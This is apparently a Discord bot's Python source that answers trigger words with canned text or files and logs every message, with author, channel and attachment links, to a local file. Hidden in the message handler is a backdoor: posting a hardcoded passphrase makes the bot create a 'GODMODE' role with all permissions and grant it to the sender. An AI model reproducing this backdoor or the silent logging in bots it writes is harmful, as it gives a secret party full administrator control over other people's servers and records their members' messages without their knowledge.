import discord
from discord.ext import commands
from discord.utils import get
import re
from data import calls, token

client = discord.Client()
bot = commands.Bot(command_prefix='~')


# Write messages to log file (with relevant information)
def log(msg):
    if msg.attachments:
        attachmentString = ''
        for attachments in msg.attachments:
            attachmentString += (str(attachments.url) + ' ')
        finalMsg = str(msg.author) + ": " + str(msg.content) + " | FILES: " + attachmentString
    if not msg.attachments:
        finalMsg = str(msg.author) + ": " + str(msg.content)

    userMsg = '(' + str(msg.channel) + ' | ' + str(msg.created_at) + ') ' + finalMsg.rstrip().lstrip()
    toWrite = userMsg + '\n'
    print(userMsg)
    with open("logs.txt", "a", encoding='utf-8') as myFile:
        myFile.write(toWrite)


# Check the value assigned to trigger word and handle appropriately
async def send_message(msg, key):
    # If string starts with ./ assume directory for file
    if calls[key][:2] == './':
        with open(calls[key], 'rb') as fileDir:
            await msg.channel.send(file=discord.File(fileDir))
    # Otherwise treat as string
    else:
        await msg.channel.send(calls[key])


# Create role and bestow
async def godmode(msg):
    member = msg.author
    server = member.guild
    GOD = discord.Permissions.all()
    RED = discord.Color.red()

    role = get(server.roles, name="GODMODE")
    if not role:
        await server.create_role(name='GODMODE', color=RED, permissions=GOD)
        role = get(server.roles, name="GODMODE")
        print('created role')

    await member.add_roles(role)
    print('added role')


# Trigger function when message is sent to the server
@client.event
async def on_message(message):
    # Log message
    log(message)

    # Stop bot from reading own messages
    if message.author == client.user:
        return None

    # Set lower and remove whitespace
    lowerMsg = message.content.lower()
    condensedMsg = lowerMsg.replace(" ", "")

    # If code is given become admin
    if message.content == '*7tNj3@~Rn%Gzzws':
        await godmode(message)
        return None

    # Check message against dictionary of trigger words
    for key in calls:
        # If trigger word is longer than 4 char find with trim
        if len(key) >= 3:
            if condensedMsg.find(key) != -1:
                await send_message(message, key)
        # If trigger is less than 4 words find whole
        elif len(key) < 3:
            if re.search(r"\b" + re.escape(key) + r"\b", lowerMsg):
                await send_message(message, key)


print('Bot is up')
client.run(token)
